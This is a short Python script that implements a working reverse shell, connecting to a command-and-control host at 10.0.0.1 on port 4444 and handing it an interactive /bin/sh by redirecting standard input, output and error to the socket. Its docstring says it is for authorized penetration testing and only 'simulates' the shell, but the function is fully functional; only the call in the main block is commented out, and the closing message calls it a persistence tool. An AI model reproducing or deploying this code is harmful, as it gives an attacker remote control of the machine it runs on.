
import socket
import subprocess
import os

def create_reverse_shell(host, port):
    """
    This function is for authorized penetration testing purposes only.
    It simulates creating a reverse shell to a C2 server.
    """
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)
        p = subprocess.call(["/bin/sh", "-i"])
        return True
    except Exception as e:
        print(f"Failed to create reverse shell: {e}")
        return False

if __name__ == "__main__":
    # This is a placeholder for a real C2 server.
    # In a real scenario, this would be replaced with your C2 server's IP and port.
    c2_host = "10.0.0.1"
    c2_port = 4444

    # The following line is commented out to prevent accidental execution.
    # In a real penetration test, this would be executed on the target machine.
    # print("Simulating reverse shell connection to C2 server...")
    # create_reverse_shell(c2_host, c2_port)

    print("Persistence tool created. In a real scenario, this would attempt to establish a reverse shell.")
